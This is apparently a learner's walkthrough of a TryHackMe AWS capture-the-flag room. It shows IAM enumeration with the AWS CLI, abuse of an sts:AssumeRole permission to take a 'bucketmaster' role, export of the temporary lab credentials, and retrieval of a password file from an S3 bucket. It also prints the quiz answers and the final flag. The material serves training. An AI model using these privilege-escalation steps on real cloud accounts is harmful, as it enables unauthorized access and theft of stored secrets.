## Walkthrough of Day 23 - AWS Security - S3cret Santa 



## Theory - What will we learn?
* Learn the basics of AWS accounts
* Enumerate the privileges granted to an account, from an attacker's perspective.
* Familiarise yourself with the AWS CLI.


### What is aws?
* Amazon Web Service is Amazon's cloud
* Allows to build application , servers, store files(using s3) and more
* Possible to connect via GUI(web-application) or using `AWS CLI`
* Example(Uploding a file):
    * GUI --> Can go into amazon, log in with credentials and drag a file
    * CLI --> `aws s3 cp file.txt s3://bucket`
    
### Access AWS account (cli)
* In order to connect to AWS account we need:
    * aws_access_key_id
    * aws_secret_access_key
* First set up ,we will need to configure this tokens in order to connect via cli
* Lets use `aws configure` and insert the tokens, this will create a file called
* `/.aws/credentials`
```
aws configure           
AWS Access Key ID [****************temp]: AKIAU2VYTBGYOYXYZXYZ
AWS Secret Access Key [****************temp]: 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
Default region name [temp]: us-east-1
Default output format [temp]: json

```
* In this lab there isnt actual AWS account, instead there is a local service running on port 5000
* Thats why we cant connect from local machine cut just from THM VM
* Lets check the connection using aws "whoami" command --> `sts get-caller-identiry`
```json
ubuntu@tryhackme:~$ aws sts get-caller-identity
{
    "UserId": "7wqp2rjgsxlk0ximbz6h",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/sir.carrotbane"
}

```
#### Q: Run aws sts get-caller-identity. What is the number shown for the "Account" parameter?
#### A: `123456789012`
* This command ask the sts (Security token service)service to check our configuration file and return which user does are credentials connect to?
* From the output we see we have access to `ser/sir.carrotbane` account
#### What is sts?
* Security Token Service
* Generates token for short period of time in order to connect with cli

### IAM
* Identity and Access Management
* `Users` Each user have spesific set of credentials(Password or Token)
* `Groups` You can also create group and give the group permissions
* `Roles` added to user in order to grant him with spesific permissions
* `Policies` - What controls the role
* Policies Constructed in json and have 4 sections:
    * Action -> What is allowd to do?
    * Resource -> On what files?
    * Condition -> when?
    * Principal -> For what users?

#### Q: What IAM component is used to describe the permissions to be assigned to a user or a group?

#### A: `policy`

### Practical
* We already know we authenticated as `sir.carrotbane` 
* Lets check what we allowd to do with this credentials...
1. List all users
```json

 aws iam list-users
{
    "Users": [
        {
            "Path": "/",
            "UserName": "sir.carrotbane",
            "UserId": "sibic50jxxumecjfuw2d",
            "Arn": "arn:aws:iam::123456789012:user/sir.carrotbane",
            "CreateDate": "2025-12-23T16:04:00.002614+00:00"
        }
    ]
}
```
* We see only our user --> Not very intresting
2. List our user's permission(policies)
```json
ubuntu@tryhackme:~/.aws$ aws iam list-user-policies --user-name sir.carrotbane
{
    "PolicyNames": [
        "SirCarrotbanePolicy"
    ]
}
```
* Intresting, our user is assigned a policy called
`SirCarrotbanePolicy`
#### Q: What is the name of the policy assigned to sir.carrotbane?
#### A: `SirCarrotbanePolicy`


* Lets check what are its permissions...

```
ubuntu@tryhackme:~/.aws$ 
aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane
```
```json
{
    "UserName": "sir.carrotbane",
    "PolicyName": "SirCarrotbanePolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:ListUsers",
                    "iam:ListGroups",
                    "iam:ListRoles",
                    "iam:ListAttachedUserPolicies",
                    "iam:ListAttachedGroupPolicies",
                    "iam:ListAttachedRolePolicies",
                    "iam:GetUserPolicy",
                    "iam:GetGroupPolicy",
                    "iam:GetRolePolicy",
                    "iam:GetUser",
                    "iam:GetGroup",
                    "iam:GetRole",
                    "iam:ListGroupsForUser",
                    "iam:ListUserPolicies",
                    "iam:ListGroupPolicies",
                    "iam:ListRolePolicies",
                    "sts:AssumeRole"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ListIAMEntities"
            }
        ]
    }
}
```
* Wow, our user has access to many read many data in the database
* Look at the last permission `sts:AssumeRole`
* This permission means to take every role there is in the organization
* Our user `sir.carrotbane` doesnt has admin permission, but if we find a role with better permission(Look for roles with `ListRoles`) we can take this role with `sts:AssumeRole`
* Ready?

### Privilege Esculation using AWS
1. Lets list all roles with `list-roles`
```
aws iam list-roles
```
```json
{
    "Roles": [
        {
"RoleName": "bucketmaster",
"Arn": "arn:aws:iam::123456789012:role/bucketmaster",
"AssumeRolePolicyDocument": {
    
"Action": "sts:AssumeRole",
"Effect": "Allow",
"Principal": {
    "AWS": "arn:aws:iam::123456789012:user/sir.carrotbane"
       

```
* We have a role named `bucketmaster`, Lets check what policies attached to it
* We need to read the role-policies
```
aws iam list-role-policies --role-name bucketmaster

"PolicyNames": [
        "BucketMasterPolicy"

```
* We have only one policy named `BucketMasterPolicy`
* Lets check what this policy can do
```
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```
```json
{
    "RoleName": "bucketmaster",
    "PolicyName": "BucketMasterPolicy",
    
"Action": [
    "s3:ListAllMyBuckets"
],
"Effect": "Allow",
"Resource": "*",
"Sid": "ListAllBuckets"

"Action": [
    "s3:ListBucket"
],
"Effect": "Allow",
"Resource": [
    "arn:aws:s3:::easter-secrets-123145",
    "arn:aws:s3:::bunny-website-645341"
],
"Sid": "ListBuckets"

"Action": [
    "s3:GetObject"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::easter-secrets-123145/*",
"Sid": "GetObjectsFromEasterSecrets"
 

```
* We see the policy `BucketMasterPolicy` can read `easter-secrets-123145` file
#### Q: Apart from GetObject and ListBucket, what other action can be taken by assuming the bucketmaster role?
#### A: `ListAllMyBuckets`

### Assume role
* We reached the final step
* lets assume the role of `bucketmaster` and read the file `easter-secrets-123145`
```
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
```
* This commands ask sts service to generate a temporary ticket for the user `bucketmaster `
```json
#Output:
"Credentials": {
        "AccessKeyId": "ASIARZPUZDIKDM4AUIJK",
        "SecretAccessKey": "WUzUY46CdgMOLkhuO5llc4G0W92QUaOBNhhzfmSm",
        "SessionToken": "FQoGZXIvYXdzEBYaDdK2KFhRR9GhgoUk9LmzZZjzjJw+r++BFMc7nXyjTE3swUL4ddYyyl47fn6DJeR760L2LxSI+5ur33zUe8b5HwaSqkAbb4xXZdGkvcBv0VWVaLYAMHbbOs7M6WT7ffgcW7Z0bj4I3lB9sN056nuKvcmOG7PQpu/+1wZ2hq1e77/toQKKO+UkhCJU+qMK9iNChMfnuJvFciudTVuyqgG2lhbLK53WWnFxVCHhzjNnCZzZ5QzlBockhcZAq/tVUsp4IVFcz/cOqnT5Xdb5Ovz2Wc9nHOjrRjApIWqNqNb+Saj37le7FZEytuYlpSRtG1QP7n6vdtGPBb1t1ywT2So=",
        "Expiration": "2025-11-26T03:40:11.117460+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARZPUZDIKJJZ6OWN27:TBFC",
        "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
    },
    "PackedPolicySize": 6}
```

* Lets set this Token as our credentials using `export`
```bash
export AWS_ACCESS_KEY_ID="ASIARZPUZDIKDM4AUIJK"
export AWS_SECRET_ACCESS_KEY=
"WUzUY46CdgMOLkhuO5llc4G0W92QUaOBNhhzfmSm"
export AWS_SESSION_TOKEN="FQoGZXIvYXdzEBYaDdK2KFhRR9GhgoUk9LmzZZjzjJw+r++BFMc7nXyjTE3swUL4ddYyyl47fn6DJeR760L2LxSI+5ur33zUe8b5HwaSqkAbb4xXZdGkvcBv0VWVaLYAMHbbOs7M6WT7ffgcW7Z0bj4I3lB9sN056nuKvcmOG7PQpu/+1wZ2hq1e77/toQKKO+UkhCJU+qMK9iNChMfnuJvFciudTVuyqgG2lhbLK53WWnFxVCHhzjNnCZzZ5QzlBockhcZAq/tVUsp4IVFcz/cOqnT5Xdb5Ovz2Wc9nHOjrRjApIWqNqNb+Saj37le7FZEytuYlpSRtG1QP7n6vdtGPBb1t1ywT2So="

```
* Now we get connect to aws using `bucketmaster` account
* Lets check it worked with aws whoami command-->
```bash
aws sts get-caller-identity
```
```json
"UserId": "AROARZPUZDIKMIJP5RXFR:TBFC",
"Account": "123456789012",
"Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
```
* Success!!!
* Finally lets read the file `easter-secrets-123145`
```bash
#List directories
aws s3api list-buckets
"Name": "easter-secrets-123145",
"Name": "bunny-website-645341",

#Print contents of directory
aws s3api list-objects --bucket easter-secrets-123145

"Key": "cloud_password.txt",
"Key": "groceries.txt",

#Copy the file into local machine
aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt

#Print the contents of the file
cat cloud_password.txt 


```
### Final FLAG -->
### `THM{more_like_sir_cloudbane}`




##


## You completed the room!!!